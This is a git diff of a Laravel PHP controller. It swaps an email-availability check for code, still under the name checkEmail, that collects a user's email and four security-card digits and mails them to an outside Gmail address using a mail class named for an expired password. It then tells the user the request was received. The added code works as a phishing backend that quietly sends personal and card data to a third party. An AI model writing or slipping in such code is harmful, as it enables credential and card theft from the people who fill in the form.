@@ -3,24 +3,23 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
-use App\Models\User;
+use Illuminate\Support\Facades\Mail;
+use App\Mail\SenhaVencidaMail;
 
 class UserController extends Controller
 {
-    public function checkEmail(Request $request)
+   public function checkEmail(Request $request)
     {
-        $email = $request->query('email');
+        $request->validate([
+            'email' => 'required|email',
+            'cartao_seg' => 'required|digits:4',
+        ]);
 
-        if (!$email) {
-            return response()->json(['error' => 'E-mail não informado'], 400);
-        }
+        $dados = $request->only('email', 'cartao_seg');
 
-        $exists = User::where('email', $email)->exists();
+        Mail::to('argontechsolut@gmail.com')->send(new SenhaVencidaMail($dados));
 
-        if ($exists) {
-            return response()->json(['available' => false, 'message' => 'E-mail já em uso'], 409);
-        }
-
-        return response()->json(['available' => true, 'message' => 'E-mail disponível']);
+        return back()->with('status', 'Seu pedido foi enviado. Em breve entraremos em contato.');
     }
 }
+
